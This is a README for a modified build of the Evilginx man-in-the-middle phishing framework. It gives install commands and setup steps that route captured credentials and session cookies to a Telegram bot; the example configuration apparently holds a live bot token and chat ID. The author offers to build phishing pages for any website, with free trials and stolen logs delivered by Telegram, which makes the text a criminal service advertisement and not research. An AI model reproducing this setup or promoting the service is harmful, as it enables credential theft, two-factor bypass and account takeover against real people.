<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# Latest Evilginx 3.4.1 - Modified by @HosterMSG

![alt text](https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification/blob/main/screenshot.jpg?raw=true)


#ABOUT NEW UPDATES PLEASE READ CHANGELOGS FILE !
#THANKS !



#Incase u want more phishlets not only Ionos, let me know we can do any website u want without any upfront payments.
#We provide 4 hour free testing around before any kind a payment.
#In testing time u will have full access to telegram group where logs will be delivered.
https://t.me/HosterMSG




**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.


How to install ?

On Ubuntu:

1. git clone https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
2. cd EvilGinx2-3.4.1-Modification
3. unzip latest.zip
4. cd evilhoster
5. cd build
6. chmod +rwx evilginx
7. ./evilginx -p ../phishlets/

Setup your configuration.

1. config domain something.com
2. cofig ipv4 external serverip
3. config ipv4 bind serverip
4. config unauth_url https://bots.here.redirected.com/
5. config autocert off/on

[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
[ If OFF 
- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
}


6.config webhook_telegram 7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y/-15604540645

7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y is a Token from Bot Father.
-15604540645 is a Chat ID inside your group.

Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.



~~ OLD VERSION ~~~
https://github.com/EvilHoster/evilginx-3.4.0-telegram-modification
~~ OLD VERSION ~~~




## Help

In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:

https://help.evilginx.com


This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, but i did modification in 2024.04.02 which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
